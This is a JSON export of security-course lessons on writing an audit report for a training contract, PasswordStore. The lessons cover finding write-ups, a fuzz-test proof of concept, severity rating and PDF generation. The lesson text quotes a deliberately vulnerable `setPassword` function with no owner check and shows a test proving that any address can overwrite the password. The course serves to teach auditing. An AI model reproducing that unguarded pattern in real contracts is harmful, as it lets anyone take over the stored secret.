          "markdownContent": "---\ntitle: Missing Access Controls Proof of Code\n---\n\n_Follow along with this video:_\n\n---\n\n### Report so far\n\n<details closed>\n<summary>Access Control Report</summary>\n\n### [S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password\n\n**Description:** The `PasswordStore::setPassword` function is set to be an `external` function, however the purpose of the smart contract and function's natspec indicate that `This function allows only the owner to set a new password.`\n\nfunction setPassword(string memory newPassword) external {\n// @Audit - There are no Access Controls.\ns_password = newPassword;\nemit SetNewPassword();\n}\n\n**Impact:** Anyone can set/change the stored password, severly breaking the contract's intended functionality\n\n**Proof of Concept:**\n\n**Recommended Mitigation:**\n\n</details>\n\n---\n\n### Proof of Concept/Proof of Code\n\nWhile this vulnerability may seem obvious, often it isn't. PoC's are valuable in proving that our claim that the protocol is at risk is valid and a serious concern.\n\nLet's write a `fuzz test` to check if in fact addresses other than the owner are able to call `setPassword`.\n\n```js\n    function test_anyone_can_set_password(address randomAddress) public {\n        vm.assume(randomAddress != owner);\n        vm.startPrank(randomAddress);\n        string memory expectedPassword = \"myNewPassword\";\n        passwordStore.setPassword(expectedPassword);\n\n        vm.startPrank(owner);\n        string memory actualPassword = passwordStore.getPassword();\n        assertEq(actualPassword, expectedPassword);\n    }\n```\n\nFoundry will pass this function random addresses to see if the assert holds, based on the number of runs we've configured.\n\n<img src=\"/security-section-3/20-missing-access-controls-proof-of-code/access-control1.png\" style=\"width: 100%; height: auto;\">\n\nWe can see that through 256 runs, our fuzz test passed! So indeed any address was able to call our `setPassword` function!.\n\n### Recommended Mitigations\n\nThe mitigation of this is pretty clear - add access control to this function.\n\nLet's add our test as a `proof of code` as well as our `recommended mitigation` to our report.\n\n<details closed>\n<summary>Access Control Report</summary>\n\n```\n### [S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password\n\n**Description:** The `PasswordStore::setPassword` function is set to be an `external` function, however the purpose of the smart contract and function's natspec indicate that `This function allows only the owner to set a new password.`\n\n'''js\nfunction setPassword(string memory newPassword) external {\n    // @Audit - There are no Access Controls.\n    s_password = newPassword;\n    emit SetNewPassword();\n}\n'''\n\n**Impact:** Anyone can set/change the stored password, severly breaking the contract's intended functionality\n\n**Proof of Concept:** Add the following to the PasswordStore.t.sol test file:\n\n'''js\nfunction test_anyone_can_set_password(address randomAddress) public {\n        vm.assume(randomAddress != owner);\n        vm.startPrank(randomAddress);\n        string memory expectedPassword = \"myNewPassword\";\n        passwordStore.setPassword(expectedPassword);\n\n        vm.startPrank(owner);\n        string memory actualPassword = passwordStore.getPassword();\n        assertEq(actualPassword, expectedPassword);\n    }\n'''\n\n**Recommended Mitigation:** Add an access control conditional to `PasswordStore::setPassword`.\n\n'''js\nif(msg.sender != s_owner){\n    revert PasswordStore__NotOwner();\n}\n'''\n```\n\n> Pro-tip: Use the dropdowns, like you've seen in these lessons, in your reports to hide big blocks of code.\n\n<details>\n<summary>Here's the syntax</summary>\n\n> ```\n> <details>\n> <summary>Code</summary>\n> '''js\n> function test_anyone_can_set_password(address >randomAddress) public {\n>        vm.assume(randomAddress != owner);\n>        vm.startPrank(randomAddress);\n>        string memory expectedPassword = \"myNewPassword\";\n>        passwordStore.setPassword(expectedPassword);\n>\n>        vm.startPrank(owner);\n>        string memory actualPassword = passwordStore.>getPassword();\n>        assertEq(actualPassword, expectedPassword);\n>    }\n> '''\n> </details>\n> ```\n\n</details>\n</details>\n\n### Wrap Up\n\nThat's two findings down. Repetition is what will strengthen these skills and make writting these reports second nature. As we saw in this lesson, security reviewers even get to do a little coding ðŸ˜‹.\n\nLet's move on to our third finding, this one should be quick!\n",
          "updates": []
        },
        {
          "lessonId": "defb06de-a27a-4658-8166-d0de739bb413",
          "number": 21,
          "title": "Finding Writeup Docs",
          "slug": "finding-writeup-docs",
          "folderName": "21-finding-writeup-docs",
          "description": "",
          "duration": 3,
          "videoUrl": "u1anf3HQb47og5FDQicBK29BMfrCQ9vMXNkD57Xg00ZM",
          "rawMarkdownUrl": "/routes/security/3-first-audit/21-finding-writeup-docs/+page.md",
          "markdownContent": "---\ntitle: Finding Writeup Documentation Fix\n---\n\n_Follow along with this video:_\n\n---\n\n### Final Finding\n\nOur last finding is `informational` in nature (we'll learn more about what that means when we go over severities), but in essence - it's not very impactful, but it's still an issue and we should report it.\n\nYou'll learn with experience that informational and gas findings don't generally require extensive write ups, but for now, let's treat this like any other finding. Fresh template time!\n\n---\n\n### [S-#] TITLE (Root Cause + Impact)\n\n**Description:**\n\n**Impact:**\n\n**Proof of Concept:**\n\n**Recommended Mitigation:**\n\n---\n\n### Title\n\n    Remember the rule of thumb: `Root Cause + Impact`\n\n- **Root Cause** - NatSpec describes a parameter that doesn't exist\n- **Impact** - NatSpec is incorrect\n\nSo our title should look something like this:\n\n    **Title:** [S-#] The `PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect.\n\nEasy.\n\n### Description\n\nHere we can just paste the problematic section of the code and briefly describe the problem.\n\n    **Description:**\n    '''\n    /*\n     * @notice This allows only the owner to retrieve the password.\n    @> * @param newPassword The new password to set.\n     */\n    function getPassword() external view returns (string memory) {}\n    '''\n\n    The `PasswordStore::getPassword` function signature is `getPassword()` while the natspec says it should be `getPassword(string)`.\n\n### Impact\n\nImpact of course is:\n\n    **Impact** The natspec is incorrect\n\n### Proof of Concept\n\nThis section isn't actually needed for a report like this, so we'll omit it.\n\n### Recommended Mitigation\n\nThis one should be obvious to us as well. We recommend the documentation is made accurate. Let's add it to the report.\n\n    **Recommended Mitigation:** Remove the incorrect natspec line\n\nWe can use a fun markdown trick to illustrate the suggested changes.\n\n```diff\n    /*\n     * @notice This allows only the owner to retrieve the password.\n-     * @param newPassword The new password to set.\n     */\n```\n\n_You can achieve this using the below syntax_\n\n    ```diff\n    + line you want to add (shown in green)\n    - line you want to remove (shown in red)\n    ```\n\nLet's put everything together into a report now.\n\n<details open>\n<summary>Finding #3 Report</summary>\n\n```\n[S-#] The `PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect.\n\n**Description:**\n    '''\n    /*\n     * @notice This allows only the owner to retrieve the password.\n    @> * @param newPassword The new password to set.\n     */\n    function getPassword() external view returns (string memory) {}\n    '''\n\n    The `PasswordStore::getPassword` function signature is `getPassword()` while the natspec says it should be `getPassword(string)`.\n\n**Impact:** The natspec is incorrect\n\n**Recommended Mitigation:** Remove the incorrect natspec line.\n\n'''diff\n    /*\n     * @notice This allows only the owner to retrieve the password.\n-     * @param newPassword The new password to set.\n     */\n'''\n\n```\n\n</details>\n\n### Wrap Up\n\nI told you this one would be quick. We nailed it. Let's look at how we can use AI to polish things up for us when we need it.\n",
          "updates": []
        },
        {
          "lessonId": "eb3162ff-7724-4efc-84cf-89cf6cb77889",
          "number": 22,
          "title": "Augmented Report With Ai",
          "slug": "augmented-report-with-ai",
          "folderName": "22-augmented-report-with-ai",
          "description": "",
          "duration": 3,
          "videoUrl": "LF8ECfsk7E025bCFXcT9KnDYDhOvknIL01UeNkiZJFCwQ",
          "rawMarkdownUrl": "/routes/security/3-first-audit/22-augmented-report-with-ai/+page.md",
          "markdownContent": "---\ntitle: Augmented Report with AI\n---\n\n_Follow along with this video:_\n\n---\n\n### Using AI to Polish things up\n\nAI's shouldn't relied upon for everything. They hallucinate and can/will make mistakes. With that said - they are great at writing reports and serving as a sanity check for security researchers.\n\nIt's possible we're not confident in our write up, or our grammar or spelling is weak. This is where AI can really shine.\n\n### Proper Prompting\n\nThe key to getting a decent response from an AI model (like ChatGPT), is to give it a decent prompt. Formatting and clarity go a long way.\n\nIn our care we want the AI to proof read our report and suggest grammar and formatting changes. It's best to give the AI a bit of context.\n\n```\nThe following is a markdown write-up of a findiing in a smart contract codebase, can you help me make sure it is grammatically correct and formatted nicely?\n\n---\nPASTE-REPORT HERE\n---\n```\n\nA prompt like the above will give the AI clear context and clear delineation between your request and the data to analyze (your findings report).\n\n> Note: The AI is going to give you something that _looks_ great at first glance. It's important to double check the AI's suggestions for accuracy. Don't simply copy over it's suggested implementation, this is very risky.\n\n### Wrap Up\n\nArtificial Intelligence, through tools like ChatGPT, can significantly streamline technical write-ups. It adds a layer of quality control, ensuring that your findings read well, look good and most importantly, communicate effectively.\n\nRemember to use these tools to your advantage when drafting complex technical reports. But as we've learnt, always remember to cross-check their work to ensure it is free from errors.\n",
          "updates": []
        },
        {
          "lessonId": "0f6e1ddc-d24a-4203-89cb-fb1ce362312b",
          "number": 23,
          "title": "Quick Primer On What We Are Learning Next",
          "slug": "quick-primer-on-what-we-are-learning-next",
          "folderName": "23-quick-primer-on-what-we-are-learning-next",
          "description": "",
          "duration": 2,
          "videoUrl": "01e3dSk89WqeZhvPuvu5LZmNq3bd849eSDUkqwvO4t3Q",
          "rawMarkdownUrl": "/routes/security/3-first-audit/23-quick-primer-on-what-we-are-learning-next/+page.md",
          "markdownContent": "---\ntitle: Quick Primer on What We Are Learning Next\n---\n\n_Follow along with this video:_\n\n---\n\n### What comes next?\n\nAlright, we've made significant progress already. Reflecting on our development journey, we have notched up three substantial findings which are currently in our repository. However, our to-do list isn't finished yet. We still have two crucial aspects to iron out.\n\nFirst, our three findings need to be appended with their respective severity ratings. We're going to look into how best to determine a findings severity and adjust our report to reflect these assessments.\n\nSecondly, we need to convert our `findings.md` - a markdown file - into a professional-looking PDF that can be shared with protocols, and showcased on our portfolio. The PDF's we'll be creating are visible on the course's [**GitHub Repo**](https://github.com/Cyfrin/3-passwordstore-audit/blob/audit-data/audit-data/report.pdf), so check them out.\n\nLet's get started with `determining a finding's severity`.\n\n<img src=\"/security-section-3/23-quick-primer/primer1.png\" style=\"width: 100%; height: auto;\">\n",
          "updates": []
        },
        {
          "lessonId": "c26e36b0-c803-49f8-8b99-3a29563ef40e",
          "number": 24,
          "title": "Severity Rating Introduction",
          "slug": "severity-rating-introduction",
          "folderName": "24-severity-rating-introduction",
          "description": "",
          "duration": 4,
          "videoUrl": "02GntIjVRQZvnqgYavxGEWbMzNoZ98an31qf02BG6qDak",
          "rawMarkdownUrl": "/routes/security/3-first-audit/24-severity-rating-introduction/+page.md",
          "markdownContent": "---\ntitle: Severity Rating Introduction\n---\n\n_Follow along with this video:_\n\n---\n\n### How to Evaluate a Finding's Severity\n\nFor this lesson we'll be referencing the [**CodeHawks Documentation**](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity). There's a section specifically outlining `How to Evaluate a Finding Severity` and we'll be leveraging that methodology here.\n\nWe'll be breaking our severities into `High`, `Medium` and `Low`. Some security researchers will include a `Critical` severity, if they believe a situation warants one, but we'll stick with these 3 for now.\n\n### Impact: High, Medium, and Low\n\nDetermining the category comes down to two elements: the likelihood of an attack and the impact of the attack. Though these can be subjective, there are some standard guidelines.\n\n1. **High Impact**: `funds` are directly or nearly `directly at risk`, or a `severe disruption` of protocol functionality or availability occurs.\n2. **Medium Impact**: `funds` are `indirectly at risk` or thereâ€™s `some level of disruption` to the protocolâ€™s functionality.\n3. **Low Impact**: `Fund are not at risk`, but a function might be incorrect, or a state handled improperly etc.\n\nThink of it in terms of user experience - _how pissed off would users be if an attack happened?_\n\n### Likelihood: High, Medium, and Low\n\nAssessing the likelihood of a certain event happening can be somewhat subjective. That said, consider the following:\n\n1. **High Likelihood**: Highly probably to happen.\n   - a hacker can call a function directly and extract money\n2. **Medium Likelihood**: Might occur under specific conditions.\n   - a peculiar ERC20 token is used on the platform.\n3. **Low Likelihood**: Unlikely to occur.\n   - a hard-to-change variable is set to a unique value at a specific time.\n\n> Note: Some situations are _so unlikely_ they're considered `computationally unfeasible` and are not considered valid attack paths.\n\n### Wrap Up\n\nWith an understanding of impact and likelihood, we're ready to start applying these methodologies to our PasswordStore audit.\n\nTake some time before moving on to familiarize yourself with the severity example available on the [**CodeHawks Documentation**](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) before moving forward!\n",
          "updates": []
        },
        {
          "lessonId": "cfca531b-48bb-4b05-ae4f-9873925a2075",
          "number": 25,
          "title": "Assesing Highs",
          "slug": "assesing-highs",
          "folderName": "25-assesing-highs",
          "description": "",
          "duration": 4,
          "videoUrl": "ukTF1ZbIFTRK2n024mfiuJ015XVpcLuzlWy01GZh9oAq00M",
          "rawMarkdownUrl": "/routes/security/3-first-audit/25-assesing-highs/+page.md",
          "markdownContent": "---\ntitle: Assessing Highs\n---\n\n_Follow along with this video:_\n\n---\n\n### Assessing Our Severities\n\nAlright! We're ready to start applying our understanding of `likelihood` and `impact` to the PasswordStore protocol. Let's take a look at our findings.\n\n```\n### [S-#] Storing the password on-chain makes it visible to anyone and no longer private\n\n### [S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password\n\n### [S-#] The 'PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect\n```\n\n## Finding #1\n\n### [S-#] Storing the password on-chain makes it visible to anyone and no longer private\n\n<details closed>\n<summary>Impacts and Likelihoods</summary>\n\n1. **High Impact**: `funds` are directly or nearly `directly at risk`, or a `severe disruption` of protocol functionality or availability occurs.\n2. **Medium Impact**: `funds` are `indirectly at risk` or thereâ€™s `some level of disruption` to the protocolâ€™s functionality.\n3. **Low Impact**: `Fund are not at risk`, but a function might be incorrect, or a state handled improperly etc.\n\n---\n\n4. **High Likelihood**: Highly probably to happen.\n   - a hacker can call a function directly and extract money\n5. **Medium Likelihood**: Might occur under specific conditions.\n   - a peculiar ERC20 token is used on the platform.\n6. **Low Likelihood**: Unlikely to occur.\n   - a hard-to-change variable is set to a unique value at a specific time.\n\n</details>\n\n---\n\nLet's consider impacts and likelhoods of our first scenario (I've provided you a reference to them above).\n\nUpon consideration we see that, while funds aren't at risk, the user's 'hidden' password being visible to anyone is a pretty severe impact to how the protocol is expected to function.\n\nBecause of this, I would argue our assessment of `Impact` should be `High`.\n\nNow, for likelihood we ask ourselves:\n\n- `How likely is it that somebody will be able to exploit this?`\n\nThe answer is - _very likely_. There's nothing stopping any malicious actor from acquiring the stored password - it's almost a certainty. `Likelihood` should also be considered `High`.\n\n### Likelihood & Impact:\n\n- Impact: High\n- Likelihood: High\n- Severity: High\n\nApplying our assessment to our finding title should look like this:\n\n<img src=\"/security-section-3/25-assessing-highs/severity1.png\" style=\"width: 100%; height: auto;\">\n\n> Pro-tip: We should try to arrange our findings in our report from High -> Low and from Worst -> Least Offenders\n\n## Finding #2\n\n### [S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password\n\n<details closed>\n<summary>Impacts and Likelihoods</summary>\n\n1. **High Impact**: `funds` are directly or nearly `directly at risk`, or a `severe disruption` of protocol functionality or availability occurs.\n2. **Medium Impact**: `funds` are `indirectly at risk` or thereâ€™s `some level of disruption` to the protocolâ€™s functionality.\n3. **Low Impact**: `Fund are not at risk`, but a function might be incorrect, or a state handled improperly etc.\n\n---\n\n4. **High Likelihood**: Highly probably to happen.\n   - a hacker can call a function directly and extract money\n5. **Medium Likelihood**: Might occur under specific conditions.\n   - a peculiar ERC20 token is used on the platform.\n6. **Low Likelihood**: Unlikely to occur.\n   - a hard-to-change variable is set to a unique value at a specific time.\n\n</details>\n\n---\n\nConsidering our second finding, we can tell that anyone being able to set the password at any time is a severe disruption of protocol functionality. A clear `High` `Impact`.\n\nThe `likelihood` is also going to be `High`. Anyone can do this, at any time, the vulnerability is rooted in `access control`.\n\n### Likehood & Impact:\n\n- Impact: High\n- Likelihood: High\n- Severity: High\n\nThe application of this to our second finding's title should leave us with:\n\n```\n### [H-1] Storing the password on-chain makes it visible to anyone and no longer private\n\n### [H-2] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password\n\n### [S-#] The 'PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect\n```\n\n### Wrap Up\n\nThis is great! We've got one more finding to assess the severity of and this one's a little different as it's `informational`. Let's go over it's `Impact` and `Likelihood` in the next lesson.\n",
          "updates": []
        },
        {
          "lessonId": "a7210936-a742-4881-8f6d-96e0d6ff315f",
          "number": 26,
          "title": "Severity Rating Informational",
          "slug": "severity-rating-informational",
          "folderName": "26-severity-rating-informational",
          "description": "",
          "duration": 3,
          "videoUrl": "PoNB79RjwrMKqxGwoTpLq8u3jvVsF82btZwus3Ay01cI",
          "rawMarkdownUrl": "/routes/security/3-first-audit/26-severity-rating-informational/+page.md",
          "markdownContent": "---\ntitle: Severity Rating Assesing Informational/Gas/Non-Crit\n---\n\n_Follow along with this video:_\n\n---\n\n## Finding #3\n\n### [S-#] The 'PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect\n\n<details closed>\n<summary>Impacts and Likelihoods</summary>\n\n1. **High Impact**: `funds` are directly or nearly `directly at risk`, or a `severe disruption` of protocol functionality or availability occurs.\n2. **Medium Impact**: `funds` are `indirectly at risk` or thereâ€™s `some level of disruption` to the protocolâ€™s functionality.\n3. **Low Impact**: `Fund are not at risk`, but a function might be incorrect, or a state handled improperly etc.\n\n---\n\n4. **High Likelihood**: Highly probably to happen.\n   - a hacker can call a function directly and extract money\n5. **Medium Likelihood**: Might occur under specific conditions.\n   - a peculiar ERC20 token is used on the platform.\n6. **Low Likelihood**: Unlikely to occur.\n   - a hard-to-change variable is set to a unique value at a specific time.\n\n</details>\n\n---\n\nJust like before, let's ask ourselves things like\n\n- `Are funds at risk?` - No.\n- `Is this a severe disruption of the protocol?` - No.\n- `Are funds indirectly at risk?` - No\n- `Is there SOME disruption of the protocol?` - Also no.\n\nIt seems already that this finding is going to be pretty low severity, but look at our `Low Impact` criteria (referenced in the dropdown above), we can see that even this doesn't seem to apply.\n\nWhat do we do?\n\n### Likelihood & Impact\n\n- Impact: NONE\n- Likelihood: HIGH\n- Severity: Informational/Gas/Non-crit\n\nIn cases like these we would want to inform the protocol that these considerations may not explicitly be bugs but they could include things like\n\n- Design Pattern Improvements\n- Test Coverage Improvements\n- Documentation Errors\n- Spelling Mistakes\n\nAnything that isn't a bug, but maybe should be considered anyway to make the code more readable etc - `Informational Severity` (sometimes called 'non-crits') There are also `Gas` severity findings, pertaining to gas optimizations, but we'll go over some of those a little later on.\n\nThis is how our titles look now:\n\n```\n### [H-1] Storing the password on-chain makes it visible to anyone and no longer private\n\n### [H-2] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password\n\n### [I-1] The 'PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect\n```\n\n### Wrap Up\n\nGreat work! Our report is looking amazing at this stage. We've consolidated our findings into a document that is clear and concise - outlining all the issues we've spotted. Our findings are well formatted and easy to understand with robust `Proofs of Code`.\n\nWhat's next?\n\nMaybe we missed something .. should we go back and do another pass? Let's go over that frame of mind in the next lesson.\n",
          "updates": []
        },
        {
          "lessonId": "fcd3ebfe-8670-4f09-9bdc-cf7f82bcda3e",
          "number": 27,
          "title": "Timeboxing",
          "slug": "timeboxing",
          "folderName": "27-timeboxing",
          "description": "",
          "duration": 2,
          "videoUrl": "P7zwQ61fT529E61VUjAySCR7Y9cHzpI3ugjlKCbTgAc",
          "rawMarkdownUrl": "/routes/security/3-first-audit/27-timeboxing/+page.md",
          "markdownContent": "---\ntitle: Timeboxing\n---\n\n_Follow along with this video:_\n\n---\n\n### Are we done?\n\nNow, we've done a lot. You're probably wondering if we should go back and look at the code again. Maybe we missed something...\n\nTake a moment to consider what you would do in a `live audit` situation. Consider your answer before continuing on.\n\n<details closed>\n<summary> The Answer </summary>\n<br>\nMaybe.\n<br>\n<br>\n\nHonestly, we can always look at one more line of code. We can always further scrutinize a repo. At some point however, we have to say \"I'm done.\"\n\nA lot of time's we're going to be time-boxed in what we do. There will be a limit to the amount of time we can reasonably spend on something. Sometimes this time-boxing is a hard limit we impose on ourselves to assure we remain at our most efficient.\n\nOften a pressing situation comes down to time management and setting bounds on the time we spend on things.\n\nWe'll go over a few time-boxing strategies a little later as well.\n\n</details>\n",
          "updates": []
        },
        {
          "lessonId": "8f66bfb6-017a-412a-9c05-48017f67c40b",
          "number": 28,
          "title": "Making A Pdf",
          "slug": "making-a-pdf",
          "folderName": "28-making-a-pdf",
          "description": "",
          "duration": 12,
          "videoUrl": "EyZXPkYslpNZ01jYOiUgHE02CQTHfVlo02UooTEwq3IAxs",
          "rawMarkdownUrl": "/routes/security/3-first-audit/28-making-a-pdf/+page.md",
          "markdownContent": "---\ntitle: Your First Full Report - Making a PDF\n---\n\n_Follow along with this video:_\n\n---\n\n### First Professional Markdown Report\n\nThis lesson covers how to convert a list of findings into a professional-looking PDF using **Markdown**.\n\nOur goal is to transform raw data into valuable information by creating a detailed and comprehensive report. Plus, this gives you something impressive to add to your portfolio!\n\n## The Basics\n\nThere are some tools and resources you'll need to prepare yourself with before getting started.\n\n[**GitHub Repo**](https://github.com/Cyfrin/audit-report-templating) - We've created a repo dedicated to assisting security reviewers with generating these reports.\n\n[**Pandoc**](https://pandoc.org/installing.html) - a universal document converter that we'll be leveraging to generate our PDFs\n\n[**LaTeX**](https://www.latex-project.org/get/) - a document preparation system for typesetting used in technical and scientific documentation primarily.\n\n[**Markdown All in One**](https://marketplace.visualstudio.com/items?itemName=yzhang.markdown-all-in-one) - Amazing VS Code extension to get the most our of markdown formatting.\n\n[**VSCode PDF**](https://marketplace.visualstudio.com/items?itemName=tomoki1207.pdf) - will allow us to preview PDF files within VSCode\n\n### Adding LaTex to Pandoc\n\nOnce `Pandoc` has been installed, it should create a folder in your root directory named `.Pandoc`, within is a `templates` folder. We want to navigate there.\n\nIn our provided GitHub Repo, you'll find a specific template file named [`eisvogel.latex`](https://github.com/Cyfrin/audit-report-templating/blob/main/eisvogel.latex). You want to copy this file into your `templates` folder.\n\n> This `eisvogel.latex` template is what's going to tell `Pandoc` how to format our PDF for us! Challenge yourself to customize this template in future!\n\n### Setting Up\n\nOnce `Pandox` and `LaTex` have been installed, create a file named `report.md` in your audit-data folder.\n\nWithin the aforementioned GitHub Repo, you'll find `report-example.md`. Copy this into your newly created file. This will be our template for building our final report.\n\n### Adding Your Own Logo\n\nLastly, let's add a bit of flare. Find an awesome logo (pdf format) and add it to the audit-data folder as well. Name this file `logo.pdf`.\n\n### Filling out report.md\n\nInside our `report.md` template, we're going to want to personalize a number of things.\n\n- **Title:** Name it something that describes your work precisely such as \"Network Vulnerability Assessment\".\n- **Author:** You!\n- **Date:** Update the audit date.\n\nNow, let's move to the sections under `===` which you can customize according to your audit:\n\n- **Prepared by:** You!\n- **Auditors:** You again! If you're working as part of a team, you can list contributors here.\n- **Protocol summary:** Describe the protocol and its workings.\n- **Disclaimer:** Enter your name in the space provided, this is to assure the protocol knows that the report is not a guarantee of bug-free code.\n- **Risk classifications:** Explain the criteria for classifying severities into High, Medium and low.\n- **Audit details:** Include the commit hash that your findings correspond to.\n- **Scope:** Include reference to the exact contracts the review has covered.\n  - _Note:_ the `â””â”€â”€ `, found in the README scope will error when we generate the PDF. Replace this with `#--`.\n- **Audit roles:** The roles of the protocol, these were some of the earliest notes we took!\n- **Executive summary:** Give a brief overview of the assessment process.\n- **Severity and number of issues found:** Summarize the number and severity of issues detailed in the report.\n- **Findings:** This is our breakdown of specific findings uncovered over the course of the audit. Paste the write-ups we've done into the respective severity categories and delete the ones we don't need!\n\nOur report is now ready to be transformed into a professional looking PDF!\n\n### Generating the PDF\n\nAlright, moment of truth. In your terminal, navigate to your `audit-data` folder. Assuming everything has gone well upto now we should just have to run the command:\n\n```bash\npandoc report.md -o report.pdf --from markdown --template=eisvogel --listings\n```\n\nAnd with a bit of magic, you should see a `report.pdf` file appear in your `audit-data` folder.\n\n### Wrap Up\n\nWow! Our report looks amazing. It's so professional, any client we provide this to would be impressed. We absolutely should add this to our portfolio to showcase all we've learned. Let's go over that in the next lesson!\n\n---\n\nOk, this wasn't easy and there are admittedly a tonned of potential pitfalls along the way. I've compiled a few possible errors/scenarios you may run into with some suggestions to troubleshoot them below.\n\n<details>\n<summary>Errors/Issues</summary>\n\n1. **My home/root directory doesn't have a `.pandoc` file!**\n\n   - Depending on your operating system, this file may exist elsewhere. If you're using WSL/Linux keep a few things in mind\n\n     - The file may be hidden - files prepended with `.` are often hidden. You can reveal all files in a directory with the command `ls -a`\n     - The file may be elsewhere - navigate back in directories (`cd ..`) until you reach one that looks like this\n\n     <img src=\"/security-section-3/28-making-a-pdf/making-a-pdf1.png\" style=\"width: 75%; height: auto;\">\n\n     ...from here navigate to `usr/share/pandoc/data/templates`. In here you will find existing templates and this is where `eisvogel.latex` should be added.\n\n2. **VS Code says I'm _unable to write a file to that directory_!**\n\n   - This is related to your user permissions, we can force the file to be created with a sudo command. `sudo touch eisvogel.latex` - this command will create a file named `eisvogel.latex` in your current directory.\n     - You may be prompted to enter your credentials or need to create an admin user.\n\n3. **VS Code says I'm _unable to write to eisvogel.latex_!**\n\n   - Similarly to above, this is permissions related. The easiest work around I found was through another `sudo` command.\n     ```bash\n     sudo tee eisvogel.latex << 'EOF'\n     [copy LaTex here]\n     EOF\n     ```\n   - The LaTex you need to copy is available [**here**](https://github.com/Cyfrin/audit-report-templating/blob/main/eisvogel.latex). Yes, you will be pasting 1068 lines into your terminal - this will overwrite your `eisvogel.latex` file, in your current directory, with that copied data.\n\n4. **When I run `pandoc report.md -o ... etc` I get _File Not Found_**\n\n   - This seems caused when our LaTex package is missing an important element. The easiest solution is to assure we have the full distribution of the package we're using. For WSL users `sudo apt install texlive-full` will resolve these errors.\n     - Note: `texlive-full` is 5.6GB in size.\n\n5. **When I run `pandoc report.md -o ... etc` I get _Missing number, treated as zero_**\n\n   - Caused by an error in the LaTex syntax either in your markdown using it, or the template itself. Replace the block of LaTeX at the top of your `report.md` file with the following:\n\n   ```\n    \\begin{titlepage}\n    \\centering\n    {\\Huge\\bfseries Protocol Audit Report\\par}\n    \\vspace{2cm}\n    \\begin{figure}[h]\n    \\centering\n    \\includegraphics[width=0.5\\textwidth]{logo.pdf}\n    \\end{figure}\n    \\vspace{2cm}\n    {\\Large Version 1.0\\par}\n    \\vspace{1cm}\n    {\\Large\\itshape equious.eth\\par}\n    \\vfill\n    {\\large \\today\\par}\n    \\end{titlepage}\n   ```\n\n   This should resolve the error.\n",
          "updates": []
        },
        {
          "lessonId": "d59eead2-453d-446c-b32b-86bcff256f96",
          "number": 29,
          "title": "Building Your Portfolio",
          "slug": "building-your-portfolio",
          "folderName": "29-building-your-portfolio",
          "description": "",
          "duration": 2,
          "videoUrl": "28oC00nqKBGCBI6ItZ9LTxe8VgUxPK02bxgw9YqgRJUlI",
          "rawMarkdownUrl": "/routes/security/3-first-audit/29-building-your-portfolio/+page.md",
          "markdownContent": "---\ntitle: Building Your Portfolio\n---\n\n_Follow along with this video:_\n\n---\n\n### Building a Portfolio\n\nNow that we've done all this amazing work, we absolutely need to show it off. The world needs to know what we're capable of.\n\n---\n\nCreate a new repository on your GitHub profile. Name it whatever you'd like. I'm going to name mine `updraft-security-portfolio`.\n\n<img src=\"../../../../static/security-section-3/29-building-your-portfolio/portfolio1.png\" style=\"width: 75%; height: auto;\">\n\n---\n\nNext, select `upload an existing file`.\n\n<img src=\"../../../../static/security-section-3/29-building-your-portfolio/portfolio2.png\" style=\"width: 75%; height: auto;\">\n\nNow, rename your report something appropriate. It's important to date your audit reports! I'll name mine `2023-12-19 PasswordStore Audit Report`.\n\n---\n\nDrag and drop your PDF into the available space on GitHub. In VS Code you can `right-click` your PDF and select `Reveal in File Explorer` or `Reveal in Finder` for PC and Mac respectively.\n\n<img src=\"../../../../static/security-section-3/29-building-your-portfolio/portfolio3.png\" style=\"width: 75%; height: auto;\">\n\n---\n\nSelect `Commit Changes` at the bottom, and that's all there is to it! You can add your own README describing the contests of this repo and your security journey. Great work!\n",
          "updates": []
        },
        {
          "lessonId": "5d5a9e52-697b-4fd3-a2c2-d0a0b9c0c97e",
          "number": 30,
          "title": "Exercises",
          "slug": "exercises",
          "folderName": "30-exercises",
          "description": "",
          "duration": 4,
          "videoUrl": "IXCGXVL01xRERCplfZDhaObUY2ydD02opBPet01g02DMtos",
          "rawMarkdownUrl": "/routes/security/3-first-audit/30-exercises/+page.md",
          "markdownContent": "---\ntitle: Exercises\n---\n\n_Follow along with this video:_\n\n---\n\n### Congratulations!\n\nI sincerely want to congratulate you on making it through your first audit experience. It's a giant leap forward in your journey to beefing up your security skills.\n\nThis codebase was obviously very small, with fairly obvious bugs, the difficulty is going to ramp up from here. Don't worry if you had a hard time spotting these vulnerabilities. So much of successful auditing comes with practice and familiarity.\n\nBy the end of this course, your portfolio will contain not one, but six impressively professional security reviews! The 'Final Boss' audit `Vault Guardians` is going to really test our skills. SO EXCITING.\n\nBefore we conclude section 3, there are 2 exercises I have for you to complete.\n\n1. **Tweet about your progress**: Publicly acknowledging and sharing your small wins often gives a big motivational boost. Tweet about your experience so far, and don't forget to join the community discussions on platforms like [**Discord**](https://discord.gg/cyfrin) and [**GitHub**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/discussions).\n2. **Sign up for Code Hawks**: Now comes the practical application of what you have learned so far. After completing this task, you will be ready to start performing \"competitive audits\". Although there are a few more skills for you to learn, you're overwhelmingly ready for this challenge! So, sign up [**here**](https://www.codehawks.com/).\n\nSection 3 NFT Challenge ðŸ‘€\n\n[Storage Refresher! (Arb)](https://arbiscan.io/address/0x89edc4c74810bedbd53d7da677eb420dc0154b0b)\n\n[Storage Refresher! (Sepolia)](https://sepolia.etherscan.io/address/0xa2626be06c11211a44fb6ca324a67ebdbcd30b70)\n\n### Take a Break\n\nNow is a perfect time to take a break (ice cream). Our next security review is a big one. Relax and bask in your accomplishments! Well done!\n",
          "updates": []
        },
        {
          "lessonId": "738358c9-f40c-4398-b434-550c0c6e4226",
          "number": 31,
          "title": "Recap & Congrats",
